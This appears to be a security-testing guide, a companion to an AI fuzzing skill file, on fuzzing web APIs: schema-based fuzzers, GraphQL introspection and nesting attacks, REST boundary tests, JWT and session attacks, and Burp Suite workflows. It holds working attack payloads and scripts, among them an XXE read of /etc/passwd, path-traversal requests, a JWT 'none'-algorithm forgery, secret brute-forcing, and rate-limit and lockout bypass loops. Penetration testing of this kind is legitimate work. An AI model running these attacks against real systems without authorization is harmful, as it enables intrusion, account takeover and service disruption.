# Web API Fuzzing: Deep Dive

> Companion to `skills/ai-fuzzing/SKILL.md`. This guide covers OpenAPI schema-based fuzzing, GraphQL fuzzing, REST API boundary testing, authentication fuzzing, and Burp Suite integration.

---

## 1. OpenAPI Schema-Based Fuzzing

### Automatic Test Generation from API Specs

OpenAPI (Swagger) specifications describe API endpoints, parameters, request bodies, and response formats. This structured metadata can drive systematic fuzzing that respects the API contract while probing its boundaries.

**Strategy**: Parse the spec, extract all endpoints and their parameter constraints, then generate inputs that violate those constraints to discover handling errors.

```bash
# Extract endpoint inventory from OpenAPI spec
jq -r '.paths | to_entries[] | "\(.key): \(.value | keys | join(", "))"' \
  openapi.json

# Extract parameter definitions per endpoint
jq -r '.paths | to_entries[] | .key as $path |
  .value | to_entries[] |
  "\($path) [\(.key)]: " +
  (.value.parameters // [] | map(.name + "(" + .schema.type + ")") | join(", "))' \
  openapi.json
```

### Schemathesis: Specification-Based Fuzzer

Schemathesis generates test cases directly from OpenAPI specs, automatically testing boundary conditions, type violations, and format mismatches.

```bash
# Install schemathesis
pip install schemathesis

# Basic run against live API
st run --base-url http://target-api.example.com \
  http://target-api.example.com/openapi.json

# Run with specific checks
st run --base-url http://target-api.example.com \
  --checks all \
  http://target-api.example.com/openapi.json

# Target specific endpoints
st run --base-url http://target-api.example.com \
  --endpoint "POST /api/v1/users" \
  http://target-api.example.com/openapi.json

# Output HTML report
st run --base-url http://target-api.example.com \
  --store-network-log report.json \
  http://target-api.example.com/openapi.json
st report report.json --output report.html

# Run with authentication
st run --base-url http://target-api.example.com \
  -H "Authorization: Bearer TOKEN" \
  http://target-api.example.com/openapi.json
```

### RESTler: Microsoft REST API Fuzzer

RESTler is a stateful REST API fuzzer that uses the OpenAPI spec to automatically discover API state dependencies and generate sequences of requests.

```bash
# Compile RESTler (if not already available)
# Requires dotnet SDK

# Compile spec to RESTler grammar
restler-compile \
  --api_spec /path/to/openapi.json

# Run fuzzing
restler-fuzz \
  --grammar_file Compile/grammar.py \
  --dictionary_file Compile/dict.json \
  --target_host api.target.com \
  --target_port 443 \
  --token_refresh_cmd "get_token.sh"

# Run with test mode (smoke test first)
restler-test \
  --grammar_file Compile/grammar.py \
  --dictionary_file Compile/dict.json \
  --target_host api.target.com
```

### Manual Schema-Based Fuzzing

When automated tools don't cover edge cases, manual schema fuzzing fills the gap.

```bash
# Extract parameter types and constraints
jq -r '.paths | to_entries[] | .value |
  .. | objects | select(.name?) |
  "\(.name): type=\(.schema.type // "unknown"), " +
  "required=\(.required // false), " +
  "enum=\(.schema.enum // []), " +
  "min=\(.schema.minimum // "none"), " +
  "max=\(.schema.maximum // "none")"' \
  openapi.json

# Generate boundary values based on type
generate_fuzz_values() {
  local type=$1
  case $type in
    integer)
      echo -e "0\n-1\n2147483647\n-2147483648\n99999999999\nNaN"
      ;;
    string)
      echo -e "''\n'x'\n'A'*10000\n'<script>'\n'%s%s%s'\n'null'\n'undefined'"
      ;;
    boolean)
      echo -e "true\nfalse\n1\n0\nnull\nyes\nno"
      ;;
    number)
      echo -e "0\n-1.0\n3.14159\n1e308\n-1e308\nInfinity\nNaN"
      ;;
  esac
}
```

---

## 2. GraphQL Fuzzing

### Query Bombing

GraphQL endpoints accept complex nested queries. Deeply nested or excessively large queries can cause DoS conditions or expose data that should be restricted.

```bash
# Basic introspection query (discover schema)
curl -X POST http://target/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# Deep nesting attack (query within query within query...)
curl -X POST http://target/api/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{
      users {
        friends {
          friends {
            friends {
              friends {
                friends {
                  id name email
                }
              }
            }
          }
        }
      }
    }"
  }'

# Batch query attack (multiple queries in single request)
curl -X POST http://target/api/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"{ user(id:1) { email } }"},
    {"query":"{ user(id:2) { email } }"},
    {"query":"{ user(id:3) { email } }"},
    {"query":"{ user(id:4) { email } }"},
    {"query":"{ user(id:5) { email } }"}
  ]'

# Alias over-fetching (request same field many times with different aliases)
curl -X POST http://target/api/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{
      a1: user(id: 1) { name }
      a2: user(id: 1) { name }
      a3: user(id: 1) { name }
      a4: user(id: 1) { name }
      a5: user(id: 1) { name }
    }"
  }'
```

### Introspection Exploitation

```bash
# Full schema dump via introspection
curl -s -X POST http://target/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name kind ofType { name } } } } } } }"}' \
  | jq . > graphql_schema.json

# Discover hidden types and fields
curl -s -X POST http://target/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { name fields { name type { name kind ofType { name } } args { name type { name } } } } }"}'

# Check for admin-only mutations
curl -s -X POST http://target/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name description args { name } } } } }"}'
```

### Field Suggestions and Error-Based Discovery

```bash
# Trigger field suggestions through typos
curl -X POST http://target/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usr { id } }"}'
# Response may include: "Did you mean \"user\"?"

# Use suggestions to map hidden fields
curl -X POST http://target/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { passwrd } }"}'
# Response may include: "Did you mean \"password\"?"

# Fuzz field names systematically
for field in admin role permissions secret token apiKey internal debug; do
  curl -s -X POST http://target/api/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ user { $field } }\"}" | grep -i "did you mean"
done

# GraphQL fuzzing tools
# Using clairvoyance (blind GraphQL schema enumeration)
pip install clairvoyance
clairvoyance http://target/api/graphql -o recovered_schema.json
```

---

## 3. REST API Boundary Testing

### Parameter Fuzzing

```bash
# Fuzz all query parameters
wfuzz -z file,/usr/share/seclists/Fuzzing/big.txt \
  --hc 400 http://target/api/v1/resource?param=FUZZ

# Integer boundary testing
for value in 0 -1 2147483647 -2147483648 4294967295 99999999999 ""; do
  echo "Testing: $value"
  curl -s -w "\nHTTP %{http_code}\n" \
    "http://target/api/v1/users?page=$value"
done

# String length boundary testing
for len in 0 1 255 256 1000 10000 100000; do
  payload=$(python3 -c "print('A' * $len)")
  curl -s -w "\nHTTP %{http_code}\n" \
    -X POST -H "Content-Type: application/json" \
    -d "{\"name\":\"$payload\"}" \
    http://target/api/v1/users
done

# Array boundary testing
curl -X POST http://target/api/v1/endpoint \
  -H "Content-Type: application/json" \
  -d '{"ids": []}'                          # Empty array
curl -X POST http://target/api/v1/endpoint \
  -H "Content-Type: application/json" \
  -d '{"ids": [1,1,1,1,1,1,1,1,1,1]}'     # Duplicate values
curl -X POST http://target/api/v1/endpoint \
  -H "Content-Type: application/json" \
  -d '{"ids": [99999999999]}'               # Out of range
```

### Content-Type Manipulation

```bash
# Test different content types for the same endpoint
content_types=(
  "application/json"
  "application/xml"
  "text/xml"
  "application/x-www-form-urlencoded"
  "multipart/form-data"
  "text/plain"
  "application/octet-stream"
  "application/protobuf"
  "application/msgpack"
)

for ct in "${content_types[@]}"; do
  echo "=== Content-Type: $ct ==="
  curl -s -w "HTTP %{http_code}\n" \
    -X POST -H "Content-Type: $ct" \
    -d '{"name":"test"}' \
    http://target/api/v1/endpoint
done

# XML External Entity (XXE) via content-type
curl -X POST http://target/api/v1/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>'
```

### Encoding Attacks

```bash
# URL encoding variations
curl "http://target/api/v1/users?name=%61%64%6d%69%6e"      # URL encoded "admin"
curl "http://target/api/v1/users?name=%2561dmin"              # Double URL encoded

# Unicode normalization attacks
curl "http://target/api/v1/users?name=admin"                   # Normal
curl "http://target/api/v1/users?name=%e2%84%abmin"           # Unicode "a" variant

# JSON injection via encoding
curl -X POST http://target/api/v1/endpoint \
  -H "Content-Type: application/json" \
  -d '{"key":"value\u0022\u002c\u0022injected\u0022\u003a\u0022true"}'
  # Attempts to break out of JSON value

# Null byte injection
curl "http://target/api/v1/files?path=../../../etc/passwd%00.png"

# Path traversal in API parameters
curl "http://target/api/v1/files?path=....//....//....//etc/passwd"
curl "http://target/api/v1/files?path=..%252f..%252f..%252fetc/passwd"
```

---

## 4. Authentication Fuzzing

### Token Manipulation

```bash
# JWT structure fuzzing (header.payload.signature)
# Modify algorithm to "none"
cat > jwt_none.py << 'PYEOF'
import base64, json
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","iat":1516239022}).encode()).rstrip(b'=').decode()
print(f"{header}.{payload}.")
PYEOF
python3 jwt_none.py
# Use resulting token:
curl -H "Authorization: Bearer <none-alg-token>" http://target/api/v1/admin

# Fuzz JWT secret with common secrets
while IFS= read -r secret; do
  token=$(python3 -c "
import jwt, sys
try:
    decoded = jwt.decode('<TARGET_JWT>', '$secret', algorithms=['HS256'])
    print(f'VALID: $secret -> {decoded}')
except: pass
")
  [ -n "$token" ] && echo "$token"
done < /usr/share/seclists/Passwords/Common-Credentials/best1050.txt

# Token format fuzzing
for token in "" "null" "undefined" "true" "false" "0" "1" "-1" "[]" "{}" \
  "Bearer " "Basic " "eyJ" "invalid.token.format"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $token" \
    http://target/api/v1/profile)
  echo "Token='$token' -> HTTP $code"
done
```

### Session Handling

```bash
# Session fixation testing
# Step 1: Get session cookie without authentication
curl -v http://target/api/v1/login 2>&1 | grep "Set-Cookie"

# Step 2: Authenticate with pre-set session ID
curl -X POST http://target/api/v1/login \
  -H "Cookie: session=FIXED_SESSION_ID" \
  -d '{"username":"admin","password":"password"}'

# Step 3: Check if session ID changed after authentication
curl -v http://target/api/v1/profile \
  -H "Cookie: session=FIXED_SESSION_ID"

# CSRF token fuzzing
# Test if CSRF token is actually validated
curl -X POST http://target/api/v1/transfer \
  -H "Content-Type: application/json" \
  -d '{"amount":100,"to":"attacker","csrf_token":""}'

curl -X POST http://target/api/v1/transfer \
  -H "Content-Type: application/json" \
  -d '{"amount":100,"to":"attacker"}'
  # Missing CSRF token entirely

# Session cookie attribute testing
curl -v http://target/api/v1/login 2>&1 | grep -i "set-cookie"
# Check for missing: Secure, HttpOnly, SameSite flags
```

### Rate Limit Testing

```bash
# Test rate limiting on authentication endpoint
for i in $(seq 1 100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://target/api/v1/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong'$i'"}')
  echo "Attempt $i: HTTP $code"
  if [ "$code" != "401" ] && [ "$code" != "429" ]; then
    echo "ANOMALY: Unexpected response at attempt $i"
  fi
done

# Test rate limit bypass with header manipulation
for header in "X-Forwarded-For: 1.2.3.$RANDOM" "X-Real-IP: 10.0.0.$RANDOM" \
  "X-Originating-IP: 192.168.1.$RANDOM"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://target/api/v1/login \
    -H "Content-Type: application/json" \
    -H "$header" \
    -d '{"username":"admin","password":"wrong"}')
  echo "Header: $header -> HTTP $code"
done

# Test account lockout bypass
# Try: different IP, different User-Agent, different session
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://target/api/v1/login \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d '{"username":"admin","password":"password'$i'"}'
done
```

---

## 5. Integration with Burp Suite

### Burp Intruder Fuzzing Configuration

```
Burp Suite Intruder Setup:

1. Proxy a valid API request through Burp
2. Send to Intruder (Ctrl+I)
3. Highlight the parameter value to fuzz
4. Payloads tab:
   - Payload set 1: Simple list
   - Add boundary values:
     0, -1, 2147483647, 99999999999
     empty, null, undefined, true, false
     <script>alert(1)</script>
     '{{7*7}}', '${7*7}'
     ../../../etc/passwd
     AAAAAAAA...A (10000 chars)
5. Resource pool: Low (to avoid DoS)
6. Start attack and monitor for anomalies
```

### Burp Extensions for API Fuzzing

```
Recommended Burp Extensions:

1. OpenAPI Parser
   - Import OpenAPI spec into Burp
   - Auto-generate requests for all endpoints
   - Sets up Intruder payloads from schema

2. JWT Editor
   - Decode, modify, and re-sign JWT tokens
   - Test algorithm confusion attacks
   - Brute-force weak secrets

3. Logger++
   - Log all requests/responses for analysis
   - Search logs for error patterns
   - Export for offline analysis

4. Autorize
   - Test authorization enforcement
   - Replay requests with different role cookies
   - Detect IDOR vulnerabilities automatically
```

### Custom Burp Workflow

```bash
# Step 1: Capture API traffic to file
# Use Burp's "Save items" to export requests

# Step 2: Replay with modifications using curl
# Convert Burp request to curl (right-click -> Copy as curl command)
curl 'http://target/api/v1/endpoint' \
  -H 'Authorization: Bearer TOKEN' \
  -H 'Content-Type: application/json' \
  --data-raw '{"param":"FUZZ_VALUE"}'

# Step 3: Script batch testing
#!/bin/bash
while IFS= read -r payload; do
  response=$(curl -s -w "\n%{http_code}" \
    -X POST http://target/api/v1/endpoint \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"param\":\"$payload\"}")
  http_code=$(echo "$response" | tail -1)
  body=$(echo "$response" | head -n -1)
  if [ "$http_code" != "400" ] && [ "$http_code" != "200" ]; then
    echo "ANOMALY: payload='$payload' code=$http_code"
    echo "  Body: $(echo $body | head -c 200)"
  fi
done < payloads.txt
```

### Automated API Testing Pipeline

```bash
# Complete API fuzzing pipeline
#!/bin/bash
BASE_URL="http://target/api/v1"
TOKEN="Bearer VALID_TOKEN"

echo "=== Phase 1: Endpoint Discovery ==="
wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  --hc 404,405 -H "$TOKEN" "$BASE_URL/FUZZ"

echo "=== Phase 2: Parameter Fuzzing ==="
# For each discovered endpoint, fuzz parameters
for endpoint in users posts comments; do
  wfuzz -z file,/usr/share/seclists/Fuzzing/big.txt \
    --hc 400 -H "$TOKEN" "$BASE_URL/$endpoint?FUZZ=test"
done

echo "=== Phase 3: Boundary Testing ==="
st run --base-url http://target -H "Authorization: $TOKEN" \
  http://target/openapi.json

echo "=== Phase 4: Auth Testing ==="
for token in "" "null" "invalid" "expired_token"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $token" "$BASE_URL/profile")
  echo "Token='$token' -> HTTP $code"
done

echo "=== Phase 5: Rate Limit Testing ==="
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST "$BASE_URL/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong"}'
done
```
